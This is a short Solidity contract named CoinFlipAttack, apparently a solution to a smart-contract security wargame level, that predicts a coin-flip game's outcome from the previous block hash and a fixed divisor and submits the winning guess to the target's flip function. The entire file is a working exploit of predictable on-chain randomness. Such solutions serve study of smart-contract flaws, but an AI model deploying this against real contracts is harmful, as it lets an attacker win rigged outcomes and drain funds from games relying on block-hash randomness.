// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    function attack(ICoinFlip _target) external {
        uint256 _blockValue = uint256(blockhash(block.number - 1));
        uint256 _factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 _coinFlip = _blockValue / _factor;
        bool _side = _coinFlip == 1;
        _target.flip(_side);
    }
}
